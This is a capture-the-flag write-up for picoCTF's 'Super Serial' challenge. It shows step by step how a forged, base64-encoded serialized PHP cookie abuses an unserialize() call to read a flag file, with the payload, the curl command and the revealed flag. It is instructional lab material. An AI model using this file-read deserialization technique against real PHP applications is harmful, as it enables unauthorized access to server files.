# Super Serial  

Eric Errickson  
**picoCTF**
*January 20th, 2022*  
  
Our Challange:  

![alt text](https://github.com/ericerrickson/picoCTF/blob/main/SuperSerial/SuperSerial.png?raw=true "Description: Try to recover the flag stored on this website http://mercury.picoctf.net:2148/")  
*Description: Try to recover the flag stored on this website <http://mercury.picoctf.net:2148/>*  

First Steps:  
Looking at the [source](https://github.com/ericerrickson/picoCTF/blob/main/SuperSerial/index.html), the only item of interest is a reference to [index.php](https://github.com/ericerrickson/picoCTF/blob/main/SuperSerial/index.php), but there is nothing useful there either.

A look at *robots.txt* gives us:  
 ```
 Disallow: /admin.phps
 ```  
 which is interesting so let us look at it.  

```
└─$ curl http://mercury.picoctf.net:2148/admin.phps
Not Found
```
Interesting. It did not disallow **admin.phps** so we can try that.  
```bash
└─$ curl http://mercury.picoctf.net:2148/index.phps  
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
        $con = new SQLite3("../users.db");
        $username = $_POST["user"];
        $password = $_POST["pass"];
        $perm_res = new permissions($username, $password);
        if ($perm_res->is_guest() || $perm_res->is_admin()) {
                setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
                header("Location: authentication.php");
                die();
        } else {
                $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
        }
}
?>
```  
OK, now we are getting somewhere. We have references to ***cookie.php*** and to ***authentication.php***, neither of which we can access directly, but we can access their source at [***/cookie.phps***](https://github.com/ericerrickson/picoCTF/blob/main/SuperSerial/cookie.phps) and at [***/authentication.phps***](https://github.com/ericerrickson/picoCTF/blob/main/SuperSerial/authentication.phps).  

So, the `Permissions` object created by ***index.php*** with  
 ```php
$perm_res = new permissions($username, $password);
```  
Is checked against a database by ***authentication.php***  
```php
        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
```
If this check is passed, that object gets cached in a cookie by URL encoding, Base-64 encoding, and then serializing it.  
```php
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
```
***Cookie.php*** will deserialize and evaluate that cookie on the next login.  
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```
We can exploit this because the cookie is client-side and we can feed the server anything that we want it to deserialize for us. The hint told us the flag is at ***../flag***

We can borrow the access_log class from ***authentication.php***
```php
class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}
```  
...and bolt on a couple of lines of php to serialize "../flag"
```php
$perm_res = new access_log("../flag");
$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));
echo $perm_res_encoded;
echo "\n";
```
When we run this script it yields  
```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
``` 
When we feed that to the server it will begin to evaluate it by deserializing it back to *"../flag"* and that will work just fine, but when it goes to the next step to evaluate the object, it is going to fall over since our object does not possess any of the methods it is looking for. When that happens that *catch* is going to be called and print out "*Deserialization error*" and append our flag to it using the *access_log.__toString()* method.

```php
catch(Error $e){
	die("Deserialization error. ".$perm);
}
```
### The Payoff  

```bash
└─$ curl http://mercury.picoctf.net:3449/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}┌
```

